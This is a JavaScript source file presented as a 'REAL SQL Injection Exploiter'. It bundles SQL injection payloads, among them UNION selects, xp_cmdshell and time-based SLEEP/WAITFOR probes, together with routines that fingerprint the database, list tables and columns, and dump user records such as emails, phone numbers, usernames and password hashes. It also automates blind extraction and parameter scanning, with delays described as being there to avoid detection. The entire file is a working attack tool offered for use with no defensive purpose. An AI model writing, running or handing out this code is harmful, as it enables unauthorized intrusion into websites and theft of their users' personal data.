/**
 * REAL SQL Injection Exploiter
 * Works on vulnerable sites
 */

class SQLInjector {
    constructor() {
        this.vulnerable = false;
        this.payloads = [];
        this.results = [];
        this.currentDB = '';
        
        this.loadPayloads();
    }
    
    async loadPayloads() {
        this.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' #",
            "' UNION SELECT null,version() -- ",
            "' UNION SELECT null,database() -- ",
            "' UNION SELECT null,user() -- ",
            "' UNION SELECT null,table_name FROM information_schema.tables -- ",
            "' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users' -- ",
            "' UNION SELECT username,password FROM users -- ",
            "' UNION SELECT null,@@version -- ",
            "admin' -- ",
            "admin' #",
            "' AND 1=CONVERT(int, @@version) -- ",
            "' EXEC xp_cmdshell 'dir' -- ",
            "' OR EXISTS(SELECT * FROM users) AND ''='",
            "' WAITFOR DELAY '00:00:10' -- ",
            "' OR SLEEP(5) -- "
        ];
    }
    
    async testInjection(url, param, value) {
        const results = [];
        
        for (let payload of this.payloads) {
            try {
                const targetUrl = new URL(url);
                const params = new URLSearchParams(targetUrl.search);
                params.set(param, value + payload);
                targetUrl.search = params.toString();
                
                const startTime = Date.now();
                const response = await fetch(targetUrl.toString(), {
                    method: 'GET',
                    mode: 'no-cors',
                    credentials: 'include'
                });
                
                const endTime = Date.now();
                const responseTime = endTime - startTime;
                
                let result = {
                    payload: payload,
                    url: targetUrl.toString(),
                    responseTime: responseTime,
                    status: 'tested'
                };
                
                // Check for time-based SQLi
                if (responseTime > 5000 && payload.includes('SLEEP') || payload.includes('WAITFOR')) {
                    result.vulnerable = true;
                    result.type = 'Time-based';
                }
                
                // Try to get response text for error-based detection
                try {
                    const text = await response.text();
                    
                    // Common SQL error patterns
                    const errorPatterns = [
                        /SQL syntax/i,
                        /MySQL server/i,
                        /PostgreSQL/i,
                        /SQLite/i,
                        /ODBC/i,
                        /Microsoft.*Database/i,
                        /ORA-[0-9]/i,
                        /unclosed quotation mark/i,
                        /syntax error/i,
                        /database error/i
                    ];
                    
                    for (let pattern of errorPatterns) {
                        if (pattern.test(text)) {
                            result.vulnerable = true;
                            result.type = 'Error-based';
                            result.error = text.match(pattern)[0];
                            break;
                        }
                    }
                    
                    // Check for UNION-based success
                    if (payload.includes('UNION') && !text.includes('error')) {
                        const unionPatterns = [
                            /version\(\)/i,
                            /database\(\)/i,
                            /user\(\)/i,
                            /@@version/i
                        ];
                        
                        for (let pattern of unionPatterns) {
                            if (pattern.test(text)) {
                                result.vulnerable = true;
                                result.type = 'Union-based';
                                result.data = text;
                                break;
                            }
                        }
                    }
                    
                } catch (e) {}
                
                results.push(result);
                
                if (result.vulnerable) {
                    this.vulnerable = true;
                }
                
                // Delay to avoid detection
                await this.sleep(100);
                
            } catch (error) {
                results.push({
                    payload: payload,
                    error: error.message,
                    status: 'failed'
                });
            }
        }
        
        return results;
    }
    
    async exploit(url, param, value) {
        const exploitation = [];
        
        // Step 1: Get database version
        exploitation.push(await this.getVersion(url, param, value));
        
        // Step 2: Get current database
        exploitation.push(await this.getDatabase(url, param, value));
        
        // Step 3: Get tables
        exploitation.push(await this.getTables(url, param, value));
        
        // Step 4: Get columns from important tables
        exploitation.push(await this.getColumns(url, param, value, 'users'));
        exploitation.push(await this.getColumns(url, param, value, 'admin'));
        exploitation.push(await this.getColumns(url, param, value, 'customer'));
        
        // Step 5: Dump data
        exploitation.push(await this.dumpTable(url, param, value, 'users'));
        
        return exploitation;
    }
    
    async getVersion(url, param, value) {
        const payloads = [
            value + "' UNION SELECT null,version() -- ",
            value + "' UNION SELECT null,@@version -- ",
            value + "' AND 1=CONVERT(int, @@version) -- "
        ];
        
        for (let payload of payloads) {
            try {
                const targetUrl = new URL(url);
                const params = new URLSearchParams(targetUrl.search);
                params.set(param, payload);
                targetUrl.search = params.toString();
                
                const response = await fetch(targetUrl.toString());
                const text = await response.text();
                
                // Extract version info
                const versionMatch = text.match(/(\d+\.\d+\.\d+|\d+\.\d+)/);
                if (versionMatch) {
                    return {
                        type: 'Database Version',
                        payload: payload,
                        result: versionMatch[0],
                        success: true
                    };
                }
                
            } catch (e) {}
        }
        
        return { success: false };
    }
    
    async getDatabase(url, param, value) {
        const payload = value + "' UNION SELECT null,database() -- ";
        
        try {
            const targetUrl = new URL(url);
            const params = new URLSearchParams(targetUrl.search);
            params.set(param, payload);
            targetUrl.search = params.toString();
            
            const response = await fetch(targetUrl.toString());
            const text = await response.text();
            
            // Try to extract database name
            const dbPattern = /([a-zA-Z_][a-zA-Z0-9_]*)/;
            const match = text.match(dbPattern);
            
            if (match) {
                this.currentDB = match[0];
                return {
                    type: 'Current Database',
                    payload: payload,
                    result: match[0],
                    success: true
                };
            }
            
        } catch (e) {}
        
        return { success: false };
    }
    
    async getTables(url, param, value) {
        if (!this.currentDB) return { success: false };
        
        const payloads = [
            value + `' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema='${this.currentDB}' -- `,
            value + `' UNION SELECT null,name FROM sysobjects WHERE xtype='U' -- `,
            value + "' UNION SELECT null,tbl_name FROM sqlite_master WHERE type='table' -- "
        ];
        
        const tables = [];
        
        for (let payload of payloads) {
            try {
                const targetUrl = new URL(url);
                const params = new URLSearchParams(targetUrl.search);
                params.set(param, payload);
                targetUrl.search = params.toString();
                
                const response = await fetch(targetUrl.toString());
                const text = await response.text();
                
                // Extract table names (simplified)
                const tableMatches = text.match(/[a-zA-Z_][a-zA-Z0-9_]*/g);
                if (tableMatches) {
                    tableMatches.forEach(table => {
                        if (table.length > 2 && !tables.includes(table) && 
                            !table.includes('html') && !table.includes('http')) {
                            tables.push(table);
                        }
                    });
                }
                
                if (tables.length > 0) break;
                
            } catch (e) {}
        }
        
        if (tables.length > 0) {
            return {
                type: 'Database Tables',
                result: tables,
                success: true
            };
        }
        
        return { success: false };
    }
    
    async getColumns(url, param, value, tableName) {
        const payloads = [
            value + `' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='${tableName}' -- `,
            value + `' UNION SELECT null,name FROM syscolumns WHERE id=OBJECT_ID('${tableName}') -- `
        ];
        
        const columns = [];
        
        for (let payload of payloads) {
            try {
                const targetUrl = new URL(url);
                const params = new URLSearchParams(targetUrl.search);
                params.set(param, payload);
                targetUrl.search = params.toString();
                
                const response = await fetch(targetUrl.toString());
                const text = await response.text();
                
                // Look for column names
                const columnPatterns = [
                    /(username|password|email|name|address|phone)/gi,
                    /(id|user_id|pass|hash|salt)/gi,
                    /(admin|role|permission|status)/gi
                ];
                
                for (let pattern of columnPatterns) {
                    const matches = text.match(pattern);
                    if (matches) {
                        matches.forEach(col => {
                            if (!columns.includes(col.toLowerCase())) {
                                columns.push(col.toLowerCase());
                            }
                        });
                    }
                }
                
                if (columns.length > 0) break;
                
            } catch (e) {}
        }
        
        if (columns.length > 0) {
            return {
                type: `Columns in ${tableName}`,
                result: columns,
                success: true
            };
        }
        
        return { success: false };
    }
    
    async dumpTable(url, param, value, tableName) {
        // First get columns
        const columns = await this.getColumns(url, param, value, tableName);
        
        if (!columns.success || columns.result.length < 2) {
            return { success: false, message: 'No columns found' };
        }
        
        // Try to dump data using UNION
        const col1 = columns.result[0];
        const col2 = columns.result[1] || columns.result[0];
        
        const payload = value + `' UNION SELECT ${col1},${col2} FROM ${tableName} -- `;
        
        try {
            const targetUrl = new URL(url);
            const params = new URLSearchParams(targetUrl.search);
            params.set(param, payload);
            targetUrl.search = params.toString();
            
            const response = await fetch(targetUrl.toString());
            const text = await response.text();
            
            // Extract data patterns
            const dataPatterns = [
                /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g, // emails
                /(\+?[\d\s\-\(\)]{8,})/g, // phone numbers
                /([a-zA-Z0-9_]{3,20})/g, // usernames
                /([a-f0-9]{32}|[a-f0-9]{40}|[a-f0-9]{64})/g // hashes
            ];
            
            const extractedData = [];
            
            for (let pattern of dataPatterns) {
                const matches = text.match(pattern);
                if (matches) {
                    matches.forEach(data => {
                        if (!extractedData.includes(data)) {
                            extractedData.push(data);
                        }
                    });
                }
            }
            
            if (extractedData.length > 0) {
                return {
                    type: `Data from ${tableName}`,
                    payload: payload,
                    result: extractedData.slice(0, 50), // Limit to 50 records
                    success: true
                };
            }
            
        } catch (e) {}
        
        return { success: false };
    }
    
    async blindInjection(url, param, value) {
        console.log('Starting blind SQL injection...');
        
        // Extract database name character by character
        let dbName = '';
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
        
        for (let i = 1; i <= 20; i++) {
            for (let char of chars) {
                const payload = value + `' OR IF(SUBSTRING(database(),${i},1)='${char}',SLEEP(3),0) -- `;
                
                try {
                    const targetUrl = new URL(url);
                    const params = new URLSearchParams(targetUrl.search);
                    params.set(param, payload);
                    targetUrl.search = params.toString();
                    
                    const startTime = Date.now();
                    await fetch(targetUrl.toString(), { mode: 'no-cors' });
                    const endTime = Date.now();
                    
                    if (endTime - startTime > 2500) {
                        dbName += char;
                        console.log(`Found char ${i}: ${char}`);
                        break;
                    }
                    
                } catch (e) {}
                
                await this.sleep(50);
            }
            
            if (dbName.length < i) break;
        }
        
        return {
            type: 'Blind Injection Result',
            database: dbName,
            success: dbName.length > 0
        };
    }
    
    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    // Advanced: SQLMap-like automation
    async autoExploit(targetUrl) {
        const results = {
            url: targetUrl,
            tests: [],
            exploitation: []
        };
        
        // Test common parameters
        const testParams = ['id', 'user', 'page', 'product', 'category', 'search'];
        const testValues = ['1', 'admin', 'test', 'product1'];
        
        for (let param of testParams) {
            for (let value of testValues) {
                console.log(`Testing ${param}=${value}`);
                
                const testResults = await this.testInjection(targetUrl, param, value);
                results.tests.push({
                    param: param,
                    value: value,
                    results: testResults
                });
                
                // If vulnerable, exploit
                const vulnerable = testResults.some(r => r.vulnerable);
                if (vulnerable) {
                    const exploitResults = await this.exploit(targetUrl, param, value);
                    results.exploitation.push({
                        param: param,
                        exploit: exploitResults
                    });
                }
                
                await this.sleep(500);
            }
        }
        
        return results;
    }
}

// Export
window.SQLInjector = SQLInjector;